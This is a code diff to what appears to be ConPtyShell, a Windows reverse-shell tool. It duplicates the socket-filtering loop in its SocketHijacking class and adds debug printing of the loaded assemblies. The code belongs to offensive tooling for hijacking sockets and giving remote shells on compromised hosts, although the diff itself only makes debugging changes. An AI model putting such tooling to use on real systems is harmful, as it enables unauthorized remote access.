@@ -128,6 +128,8 @@ using System.Runtime.InteropServices;
 using System.Diagnostics;
 using System.Collections.Generic;
 
+using System.Reflection;
+
 public class ConPtyShellException : Exception
 {
     private const string error_string = "[-] ConPtyShellException: ";
@@ -590,8 +592,10 @@ public static class SocketHijacking
 
     private static List<IntPtr> FilterAndOrderSocketsByBytesIn(List<IntPtr> sockets)
     {
-        List<SOCKET_BYTESIN> socketsBytesIn = new List<SOCKET_BYTESIN>();
+        List<SOCKET_BYTESIN> socketsBytesIn1 = new List<SOCKET_BYTESIN>();
+        List<SOCKET_BYTESIN> socketsBytesIn2 = new List<SOCKET_BYTESIN>();
         List<IntPtr> socketsOut = new List<IntPtr>();
+        
         foreach (IntPtr sock in sockets)
         {
             TCP_INFO_v0 sockInfo = new TCP_INFO_v0();
@@ -607,16 +611,38 @@ public static class SocketHijacking
                 SOCKET_BYTESIN sockBytesIn = new SOCKET_BYTESIN();
                 sockBytesIn.handle = sock;
                 sockBytesIn.BytesIn = sockInfo.BytesIn;
-                socketsBytesIn.Add(sockBytesIn);
+                socketsBytesIn1.Add(sockBytesIn);
             }
             else
                 closesocket(sock);
         }
-        if (socketsBytesIn.Count < 1) return socketsOut;
-        if (socketsBytesIn.Count >= 2)
+
+        foreach (IntPtr sock in sockets)
+        {
+            TCP_INFO_v0 sockInfo = new TCP_INFO_v0();
+            if (!GetSocketTcpInfo(sock, out sockInfo))
+            {
+                closesocket(sock);
+                continue;
+            }
+            Console.WriteLine("debug: Socket handle 0x" + sock.ToString("X4") + " is in tcpstate " + sockInfo.State.ToString());
+            // we need only active sockets, the remaing sockets are filtered out
+            if (sockInfo.State == TcpState.SynReceived || sockInfo.State == TcpState.Established)
+            {
+                SOCKET_BYTESIN sockBytesIn = new SOCKET_BYTESIN();
+                sockBytesIn.handle = sock;
+                sockBytesIn.BytesIn = sockInfo.BytesIn;
+                socketsBytesIn2.Add(sockBytesIn);
+            }
+            else
+                closesocket(sock);
+        }
+
+        if (socketsBytesIn2.Count < 1) return socketsOut;
+        if (socketsBytesIn2.Count >= 2)
             // ordering for fewer bytes received by the sockets we have a higher chance to get the proper socket
-            socketsBytesIn.Sort(delegate (SOCKET_BYTESIN a, SOCKET_BYTESIN b) { return (a.BytesIn.CompareTo(b.BytesIn)); });
-        foreach (SOCKET_BYTESIN sockBytesIn in socketsBytesIn)
+            socketsBytesIn2.Sort(delegate (SOCKET_BYTESIN a, SOCKET_BYTESIN b) { return (a.BytesIn.CompareTo(b.BytesIn)); });
+        foreach (SOCKET_BYTESIN sockBytesIn in socketsBytesIn2)
         {
             socketsOut.Add(sockBytesIn.handle);
             Console.WriteLine("debug: Socket handle 0x" + sockBytesIn.handle.ToString("X4") + " total bytes received: " + sockBytesIn.BytesIn.ToString());
@@ -1467,6 +1493,16 @@ public static class ConPtyShell
         Process currentProcess = null;
         Process parentProcess = null;
         Process grandParentProcess = null;
+
+        AppDomain ad = AppDomain.CurrentDomain;
+        Assembly[] loadedAssemblies = ad.GetAssemblies();
+
+        Console.WriteLine("Here are the assemblies loaded in this appdomain\n");
+        foreach (Assembly a in loadedAssemblies)
+        {
+            Console.WriteLine(a.FullName);
+        }
+
         if (GetProcAddress(GetModuleHandle("kernel32"), "CreatePseudoConsole") != IntPtr.Zero)
             conptyCompatible = true;
         CreatePipes(ref InputPipeRead, ref InputPipeWrite, ref OutputPipeRead, ref OutputPipeWrite);
